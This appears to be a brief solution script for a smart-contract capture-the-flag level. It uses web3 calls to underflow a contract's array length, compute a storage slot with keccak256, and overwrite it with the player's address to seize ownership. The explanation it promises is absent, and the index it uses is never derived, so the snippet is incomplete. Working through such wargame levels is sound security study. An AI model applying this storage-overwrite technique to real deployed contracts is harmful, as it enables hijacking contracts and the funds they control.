/*
    Explaination will come up later on
*/

await contract.makeContract()

await contract.retract()

p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

content = '0x' + '0'.repeat(24) + player.slice(2) 

await contract.revise(i, content) 